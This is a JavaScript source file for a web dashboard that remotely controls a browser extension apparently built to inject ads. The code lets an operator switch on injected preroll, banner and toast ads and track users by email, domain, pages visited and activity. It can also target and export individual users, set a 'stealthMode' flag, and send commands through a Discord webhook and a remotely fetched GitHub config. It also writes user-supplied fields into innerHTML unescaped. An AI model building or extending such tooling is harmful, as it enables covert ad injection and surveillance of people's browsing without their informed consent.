// SP Extension Dashboard JavaScript
// Real-time web interface for controlling the SP extension

class SPDashboard {
    constructor() {
        // Configuration - these can be set via environment variables in Vercel
        this.config = {
            githubConfigUrl: window.GITHUB_CONFIG_URL || 'https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/config.json',
            discordWebhook: window.DISCORD_WEBHOOK_URL || null,
            dataEndpoint: window.DATA_ENDPOINT || null
        };
        
        this.currentConfig = {};
        this.activeUsers = new Map();
        this.targetedUser = null;
        this.hasRealData = false; // Track if we have real data vs placeholder
        
        this.init();
    }

    async init() {
        console.log('🎯 Initializing SP Extension Dashboard...');
        
        // Check if we have real configuration
        this.checkRealConfig();
        
        this.setupEventListeners();
        await this.loadCurrentConfig();
        this.startRealTimeUpdates();
        this.updateUI();
        
        console.log('✅ Dashboard ready!');
    }

    checkRealConfig() {
        const missingConfig = [];
        
        if (!this.config.discordWebhook) {
            missingConfig.push('Discord Webhook');
        }
        
        if (!this.config.dataEndpoint) {
            missingConfig.push('Data Endpoint');
        }
        
        if (missingConfig.length > 0) {
            this.showAlert('warning', 
                `⚠️ Missing configuration: ${missingConfig.join(', ')}. ` +
                'Dashboard will work in demo mode. Set environment variables for full functionality.'
            );
        }
    }

    setupEventListeners() {
        // Toggle controls
        document.getElementById('masterToggle').addEventListener('click', () => this.toggleFeature('enabled'));
        document.getElementById('prerollToggle').addEventListener('click', () => this.toggleFeature('preroll'));
        document.getElementById('bannerToggle').addEventListener('click', () => this.toggleFeature('banners'));
        document.getElementById('toastToggle').addEventListener('click', () => this.toggleFeature('toast'));

        // Frequency sliders
        const bannerSlider = document.getElementById('bannerFrequencySlider');
        const bannerValueDisplay = document.getElementById('bannerFrequencyValue');
        bannerSlider.addEventListener('input', (e) => {
            const value = e.target.value;
            bannerValueDisplay.textContent = value;
            this.updateBannerFrequency(value);
        });

        const toastSlider = document.getElementById('toastFrequencySlider');
        const toastValueDisplay = document.getElementById('toastFrequencyValue');
        toastSlider.addEventListener('input', (e) => {
            const value = e.target.value;
            toastValueDisplay.textContent = value;
            this.updateToastFrequency(value);
        });

        // Action buttons
        document.getElementById('emergencyStop').addEventListener('click', () => this.emergencyStop());
        document.getElementById('enableAllBtn').addEventListener('click', () => this.enableAll());
        document.getElementById('disableAllBtn').addEventListener('click', () => this.disableAll());
        document.getElementById('changeVideoBtn').addEventListener('click', () => this.changeVideo());
        document.getElementById('targetUserBtn').addEventListener('click', () => this.targetUser());
        document.getElementById('flushDataBtn').addEventListener('click', () => this.flushData());

        // Slot assignment controls
        document.getElementById('slotPreset').addEventListener('change', (e) => {
            const customConfig = document.getElementById('customSlotConfig');
            customConfig.style.display = e.target.value === 'custom' ? 'block' : 'none';
        });
        
        document.getElementById('slotPrerollVideo').addEventListener('change', (e) => {
            const customVideoInput = document.getElementById('customSlotVideo');
            customVideoInput.style.display = e.target.value === 'custom' ? 'block' : 'none';
        });
        
        // Slot range sliders
        document.getElementById('slotBanners').addEventListener('input', (e) => {
            document.getElementById('slotBannersValue').textContent = e.target.value;
        });
        document.getElementById('slotToasts').addEventListener('input', (e) => {
            document.getElementById('slotToastsValue').textContent = e.target.value;
        });
        
        document.getElementById('assignSlotBtn').addEventListener('click', () => this.assignUserSlot());
        document.getElementById('clearSlotBtn').addEventListener('click', () => this.clearUserSlot());

        // User table clicks - different behavior for different columns
        document.getElementById('usersTable').addEventListener('click', (e) => {
            const row = e.target.closest('.user-row');
            if (!row) return;
            
            const userId = row.dataset.userid;
            const clickedCell = e.target.closest('td');
            const cellIndex = Array.from(row.cells).indexOf(clickedCell);
            
            // Actions column (index 5) - show user details
            if (cellIndex === 5 && clickedCell.textContent.includes('View')) {
                this.showUserDetails(userId);
            } else {
                // Any other column - target user
                this.targetUserById(userId);
            }
        });

        // Modal controls
        const modal = document.getElementById('userModal');
        const closeBtn = document.querySelector('.close');
        
        closeBtn.addEventListener('click', () => {
            modal.style.display = 'none';
        });
        
        window.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        });

        document.getElementById('targetThisUserBtn').addEventListener('click', () => {
            const userId = document.getElementById('modalUserId').textContent;
            this.targetUserById(userId);
            modal.style.display = 'none';
        });

        document.getElementById('exportUserDataBtn').addEventListener('click', () => {
            const userId = document.getElementById('modalUserId').textContent;
            this.exportUserData(userId);
        });
    }

    async loadCurrentConfig() {
        try {
            const response = await fetch(this.config.githubConfigUrl + '?t=' + Date.now());
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            this.currentConfig = await response.json();
            this.hasRealData = true;
            console.log('📥 Config loaded:', this.currentConfig);
            this.showAlert('success', '✅ Configuration loaded successfully!');
            
        } catch (error) {
            console.error('Failed to load config:', error);
            this.hasRealData = false;
            this.currentConfig = this.getDefaultConfig();
            this.showAlert('danger', 
                '❌ Failed to load real configuration. Using default settings. ' +
                'Check your GitHub repository URL in environment variables.'
            );
        }
    }

    getDefaultConfig() {
        return {
            enabled: false,
            display_frequency: 50,
            features: {
                preroll: false,
                banners: false,
                toast: false
            },
            video_id: "YV0NfxtK0n0"
        };
    }

    async updateGitHubConfig(updates) {
        // In real implementation, this would use GitHub API to update config.json
        // For now, we'll just send commands via Discord webhook
        
        const updatedConfig = { ...this.currentConfig, ...updates };
        
        try {
            // Send update command via Discord
            await fetch(this.config.discordWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔄 **Config Update from Dashboard**`,
                    embeds: [{
                        title: "Configuration Changes",
                        color: 3447003,
                        fields: [
                            { name: "Updates", value: JSON.stringify(updates, null, 2), inline: false },
                            { name: "Source", value: "Web Dashboard", inline: true },
                            { name: "Timestamp", value: new Date().toISOString(), inline: true }
                        ]
                    }]
                })
            });
            
            this.currentConfig = updatedConfig;
            this.showAlert('success', 'Configuration updated successfully!');
            
        } catch (error) {
            console.error('Failed to update config:', error);
            this.showAlert('danger', 'Failed to update configuration');
        }
    }

    async sendCommand(command, args = {}) {
        try {
            await fetch(this.config.discordWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `⚡ **Dashboard Command**: ${command}`,
                    embeds: [{
                        title: "Real-time Command Execution",
                        color: 15158332,
                        fields: [
                            { name: "Command", value: command, inline: true },
                            { name: "Arguments", value: JSON.stringify(args, null, 2), inline: true },
                            { name: "Source", value: "Web Dashboard", inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });
            
            this.showAlert('success', `Command "${command}" sent successfully!`);
            
        } catch (error) {
            console.error('Failed to send command:', error);
            this.showAlert('danger', `Failed to send command: ${command}`);
        }
    }

    // UI Control Methods
    async toggleFeature(feature) {
        const toggleElement = document.getElementById(feature + 'Toggle') || document.getElementById('masterToggle');
        const isActive = toggleElement.classList.contains('active');
        
        if (isActive) {
            toggleElement.classList.remove('active');
        } else {
            toggleElement.classList.add('active');
        }
        
        let configUpdate = {};
        
        if (feature === 'enabled') {
            configUpdate.enabled = !isActive;
        } else {
            configUpdate.features = { ...this.currentConfig.features };
            configUpdate.features[feature] = !isActive;
        }
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand(`TOGGLE_${feature.toUpperCase()}`, { enabled: !isActive });
    }

    async updateBannerFrequency(value) {
        const configUpdate = { banner_frequency: parseInt(value) };
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('SET_BANNER_FREQUENCY', { frequency: value });
    }

    async updateToastFrequency(value) {
        const configUpdate = { toast_frequency: parseInt(value) };
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('SET_TOAST_FREQUENCY', { frequency: value });
    }

    async emergencyStop() {
        if (confirm('Are you sure you want to EMERGENCY STOP all extensions?')) {
            await this.sendCommand('EMERGENCY_STOP');
            
            // Update all toggles to off
            document.querySelectorAll('.toggle').forEach(toggle => {
                toggle.classList.remove('active');
            });
            
            this.showAlert('danger', '🚨 EMERGENCY STOP ACTIVATED - All extensions disabled');
        }
    }

    async enableAll() {
        document.querySelectorAll('.toggle').forEach(toggle => {
            toggle.classList.add('active');
        });
        
        const configUpdate = {
            enabled: true,
            features: { preroll: true, banners: true, toast: true }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('ENABLE_ALL');
    }

    async disableAll() {
        document.querySelectorAll('.toggle').forEach(toggle => {
            toggle.classList.remove('active');
        });
        
        const configUpdate = {
            enabled: false,
            features: { preroll: false, banners: false, toast: false }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('DISABLE_ALL');
    }

    async changeVideo() {
        const videoSelect = document.getElementById('videoSelect');
        const videoId = videoSelect.value;
        const videoText = videoSelect.options[videoSelect.selectedIndex].text;
        
        const configUpdate = {
            preroll: { ...this.currentConfig.preroll, videoId: videoId }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('CHANGE_VIDEO', { videoId, videoText });
    }

    async targetUser() {
        const userIdInput = document.getElementById('targetUserId');
        const userId = userIdInput.value.trim();
        
        if (userId) {
            await this.targetUserById(userId);
            userIdInput.value = '';
        }
    }

    async targetUserById(userId) {
        // Remove previous targeting
        document.querySelectorAll('.user-row').forEach(row => {
            row.classList.remove('targeted');
        });
        
        // Add targeting to selected user
        const userRow = document.querySelector(`[data-userid="${userId}"]`);
        if (userRow) {
            userRow.classList.add('targeted');
        }
        
        this.targetedUser = userId;
        
        const configUpdate = {
            realtime_control: { 
                ...this.currentConfig.realtime_control, 
                target_user: userId 
            }
        };
        
        await this.updateGitHubConfig(configUpdate);
        await this.sendCommand('TARGET_USER', { userId });
        
        this.showAlert('warning', `🎯 User ${userId} is now TARGETED`);
    }

    async flushData() {
        await this.sendCommand('FORCE_FLUSH_DATA');
        this.showAlert('success', '💾 All extension data flushed to servers');
    }

    // User Slot Assignment Methods
    async assignUserSlot() {
        const userId = document.getElementById('slotUserId').value.trim();
        const preset = document.getElementById('slotPreset').value;
        
        if (!userId) {
            this.showAlert('warning', '⚠️ Please enter a user email or ID');
            return;
        }
        
        if (!preset) {
            this.showAlert('warning', '⚠️ Please select a slot preset');
            return;
        }
        
        let slotConfig = {};
        
        // Handle preset configurations using DASHBOARD_CONFIG
        if (preset === 'custom') {
            // Get custom values
            let videoId = document.getElementById('slotPrerollVideo').value;
            if (videoId === 'custom') {
                videoId = document.getElementById('customSlotVideo').value.trim();
                if (!videoId) {
                    this.showAlert('warning', '⚠️ Please enter a custom video ID');
                    return;
                }
            }
            
            slotConfig = {
                slotMode: 'custom',
                bannersPerPage: parseInt(document.getElementById('slotBanners').value),
                toastsPerSession: parseInt(document.getElementById('slotToasts').value),
                prerollEnabled: true,
                stealthMode: false,
                customVideoId: videoId || null
            };
        } else {
            // Use preset configuration from DASHBOARD_CONFIG
            const presets = window.DASHBOARD_CONFIG.slotPresets;
            const presetConfig = presets[preset];
            
            if (!presetConfig) {
                this.showAlert('danger', '❌ Invalid slot preset');
                return;
            }
            
            slotConfig = {
                slotMode: preset,
                bannersPerPage: presetConfig.bannersPerPage,
                toastsPerSession: presetConfig.toastsPerSession,
                prerollEnabled: presetConfig.prerollEnabled,
                stealthMode: presetConfig.stealthMode
            };
        }
        
        try {
            // Update user settings in Supabase
            const success = await window.dashboardSupabase.updateUserSettings(userId, slotConfig);
            
            if (success) {
                this.showAlert('success', `✅ Slot "${slotConfig.slotMode}" assigned to user: ${userId}`);
                
                // Clear form
                this.clearSlotForm();
                
                // Refresh user list to show updated targeting
                this.updateActiveUsers();
                
                // Send Discord notification for important slot assignments
                await this.sendCommand('slot_assigned', {
                    userId: userId,
                    slotMode: slotConfig.slotMode,
                    config: slotConfig
                });
                
            } else {
                throw new Error('Failed to update user settings in database');
            }
            
        } catch (error) {
            console.error('Failed to assign slot:', error);
            this.showAlert('danger', `❌ Failed to assign user slot: ${error.message}`);
        }
    }

    async clearUserSlot() {
        const userId = document.getElementById('slotUserId').value.trim();
        
        if (!userId) {
            this.showAlert('warning', '⚠️ Please enter a user email or ID');
            return;
        }
        
        await this.sendDataToDatabase('CLEAR_USER_SLOT', { userId });
        this.showAlert('success', `✅ Slot assignment cleared for user: ${userId}`);
        
        this.clearSlotForm();
    }

    clearSlotForm() {
        document.getElementById('slotUserId').value = '';
        document.getElementById('slotPreset').value = '';
        document.getElementById('customSlotConfig').style.display = 'none';
        document.getElementById('customSlotVideo').style.display = 'none';
    }

    async sendDataToDatabase(action, data) {
        if (!this.config.dataEndpoint) {
            // Send critical alert to Discord only for important events
            if (action.includes('ASSIGN') || action.includes('CLEAR')) {
                await this.sendCommand('CRITICAL_UPDATE', { action, data });
            }
            this.showAlert('warning', '⚠️ No database endpoint configured. Using Discord webhook.');
            return;
        }
        
        try {
            // Send to proper database API
            const response = await fetch(`${this.config.dataEndpoint}/${action.toLowerCase()}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error(`Database error: ${response.status}`);
            }
            
            // Only send Discord notification for high-priority events
            if (data.userId && action.includes('ASSIGN')) {
                await this.sendCommand('HIGH_VALUE_TARGET_ASSIGNED', { 
                    userId: data.userId, 
                    preset: data.preset 
                });
            }
            
        } catch (error) {
            console.error('Database operation failed:', error);
            this.showAlert('danger', '❌ Failed to save to database');
        }
    }

    // User Details Modal Methods
    async showUserDetails(userId) {
        const modal = document.getElementById('userModal');
        
        try {
            // In real implementation, fetch detailed user data
            const userDetails = await this.fetchUserDetails(userId);
            
            // Populate modal with user data
            document.getElementById('modalEmail').textContent = userDetails.email || 'N/A';
            document.getElementById('modalUserId').textContent = userDetails.id;
            document.getElementById('modalDomain').textContent = userDetails.domain;
            document.getElementById('modalLastSeen').textContent = userDetails.lastSeen;
            document.getElementById('modalSessions').textContent = userDetails.totalSessions || 0;
            document.getElementById('modalImpressions').textContent = userDetails.impressions || 0;
            document.getElementById('modalClicks').textContent = userDetails.clicks || 0;
            document.getElementById('modalTimeSpent').textContent = userDetails.timeSpent || '0 min';
            document.getElementById('modalPages').textContent = userDetails.pagesVisited || 0;
            document.getElementById('modalBrowser').textContent = userDetails.browser || 'Unknown';
            
            // Populate recent activity
            const activityDiv = document.getElementById('modalActivity');
            if (userDetails.recentActivity && userDetails.recentActivity.length > 0) {
                activityDiv.innerHTML = userDetails.recentActivity.map(activity => `
                    <div style="margin-bottom: 8px; padding: 8px; background: rgba(0, 212, 255, 0.1); border-radius: 4px;">
                        <strong>${activity.timestamp}</strong> - ${activity.description}
                    </div>
                `).join('');
            } else {
                activityDiv.innerHTML = '<p style="color: #94a3b8;">No recent activity recorded.</p>';
            }
            
            modal.style.display = 'block';
            
        } catch (error) {
            console.error('Failed to load user details:', error);
            this.showAlert('danger', '❌ Failed to load user details');
        }
    }

    async fetchUserDetails(userId) {
        if (!this.config.dataEndpoint) {
            // Return mock data for demo
            return {
                id: userId,
                email: 'demo@example.com',
                domain: 'youtube.com',
                lastSeen: '2 minutes ago',
                totalSessions: 15,
                impressions: 23,
                clicks: 3,
                timeSpent: '45 min',
                pagesVisited: 127,
                browser: 'Chrome 119',
                recentActivity: [
                    { timestamp: '2:30 PM', description: 'Clicked pre-roll ad on YouTube' },
                    { timestamp: '2:25 PM', description: 'Viewed banner ad on reddit.com' },
                    { timestamp: '2:20 PM', description: 'Session started on youtube.com' }
                ]
            };
        }
        
        // Real implementation - fetch from data endpoint
        const response = await fetch(`${this.config.dataEndpoint}/user/${userId}`);
        return await response.json();
    }

    async exportUserData(userId) {
        try {
            const userDetails = await this.fetchUserDetails(userId);
            
            const dataStr = JSON.stringify(userDetails, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            
            const link = document.createElement('a');
            link.href = URL.createObjectURL(dataBlob);
            link.download = `user_${userId}_data.json`;
            link.click();
            
            this.showAlert('success', `✅ User data exported for: ${userId}`);
            
        } catch (error) {
            console.error('Failed to export user data:', error);
            this.showAlert('danger', '❌ Failed to export user data');
        }
    }

    // Real-time data updates
    startRealTimeUpdates() {
        // Update stats every 30 seconds
        setInterval(() => {
            this.updateStats();
            this.updateActiveUsers();
        }, 30000);
        
        // Initial update
        this.updateStats();
        this.updateActiveUsers();
    }

    async updateStats() {
        try {
            // Use Supabase for real stats
            const stats = await window.dashboardSupabase.getAnalyticsSummary();
            
            document.getElementById('activeUsers').textContent = stats.activeUsers || 0;
            document.getElementById('totalImpressions').textContent = (stats.totalImpressions || 0).toLocaleString();
            document.getElementById('clickThrough').textContent = (stats.clickThrough || 0).toFixed(1) + '%';
            document.getElementById('sessionsToday').textContent = (stats.sessionsToday || 0).toLocaleString();
            
            console.log('📊 Stats updated:', stats);
            
        } catch (error) {
            console.error('Failed to update stats:', error);
            // Keep stats at 0 if there's an error
            document.getElementById('activeUsers').textContent = '0';
            document.getElementById('totalImpressions').textContent = '0';
            document.getElementById('clickThrough').textContent = '0%';
            document.getElementById('sessionsToday').textContent = '0';
        }
    }

    async updateActiveUsers() {
        try {
            // Fetch real active users from Supabase
            const users = await window.dashboardSupabase.getActiveUsers();
            
            const tbody = document.getElementById('usersTable');
            
            if (users.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="7" style="text-align: center; color: #94a3b8; padding: 40px;">
                            <i class="fas fa-user-slash" style="font-size: 24px; margin-bottom: 10px; display: block;"></i>
                            No active users detected. Install and activate the extension to see real-time data.
                            <br><small style="margin-top: 10px; display: block; opacity: 0.7;">
                                Connected to Supabase database: ${users.length === 0 ? 'No data' : 'Connected'}
                            </small>
                        </td>
                    </tr>
                `;
                return;
            }
            
            // Display real user data with new column order: Email, Domain, Last Seen, Impressions, Status, Actions, User ID
            tbody.innerHTML = users.map(user => `
                <tr class="user-row ${user.targeted ? 'targeted' : ''}" data-userid="${user.id}">
                    <td>${user.email}</td>
                    <td>${user.domain}</td>
                    <td>${user.lastSeen}</td>
                    <td>${user.impressions}</td>
                    <td>
                        <span style="color: ${user.targeted ? '#ff0066' : '#00ff88'};">
                            ${user.targeted ? '🎯' : '●'}
                        </span> 
                        ${user.targeted ? 'TARGETED' : user.status}
                    </td>
                    <td>
                        <button class="btn btn-primary" style="padding: 5px 10px; margin: 0; font-size: 0.8em;">
                            View Details
                        </button>
                    </td>
                    <td style="font-family: monospace; font-size: 0.85em;">${user.id}</td>
                </tr>
            `).join('');
            
            console.log(`👥 Updated ${users.length} active users from Supabase`);
            
        } catch (error) {
            console.error('Failed to update active users:', error);
            
            // Show error in table
            const tbody = document.getElementById('usersTable');
            tbody.innerHTML = `
                <tr>
                    <td colspan="7" style="text-align: center; color: #f56565; padding: 40px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 24px; margin-bottom: 10px; display: block;"></i>
                        Failed to load user data from Supabase
                        <br><small style="margin-top: 10px; display: block; opacity: 0.7;">
                            Error: ${error.message}
                        </small>
                    </td>
                </tr>
            `;
        }
    }

    updateUI() {
        // Update toggles based on current config
        if (this.currentConfig.enabled) {
            document.getElementById('masterToggle').classList.add('active');
        }
        
        if (this.currentConfig.features) {
            if (this.currentConfig.features.preroll) {
                document.getElementById('prerollToggle').classList.add('active');
            }
            if (this.currentConfig.features.banners) {
                document.getElementById('bannerToggle').classList.add('active');
            }
            if (this.currentConfig.features.toast) {
                document.getElementById('toastToggle').classList.add('active');
            }
        }
        
        // Update frequency slider
        if (this.currentConfig.display_frequency) {
            const slider = document.getElementById('frequencySlider');
            const valueDisplay = document.getElementById('frequencyValue');
            slider.value = this.currentConfig.display_frequency;
            valueDisplay.textContent = this.currentConfig.display_frequency + '%';
        }
    }

    showAlert(type, message) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type}`;
        alertDiv.textContent = message;
        
        const activityLog = document.getElementById('activityLog');
        
        // Remove the "No recent activity" message if it exists
        const noActivityMessage = activityLog.querySelector('div:not(.alert)');
        if (noActivityMessage) {
            noActivityMessage.remove();
        }
        
        activityLog.insertBefore(alertDiv, activityLog.firstChild);
        
        // Remove old alerts (keep only last 10)
        const alerts = activityLog.querySelectorAll('.alert');
        if (alerts.length > 10) {
            alerts[alerts.length - 1].remove();
        }
        
        // Auto-remove success/warning alerts after 5 seconds
        if (type === 'success' || type === 'warning') {
            setTimeout(() => {
                if (alertDiv.parentNode) {
                    alertDiv.remove();
                }
            }, 5000);
        }
    }
}

// Initialize dashboard when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.spDashboard = new SPDashboard();
});

// Simulate connection status
setInterval(() => {
    const indicator = document.getElementById('connectionStatus');
    // Occasionally flicker to yellow to show activity
    if (Math.random() < 0.1) {
        indicator.style.background = '#f39c12';
        setTimeout(() => {
            indicator.style.background = '#27ae60';
        }, 1000);
    }
}, 5000); 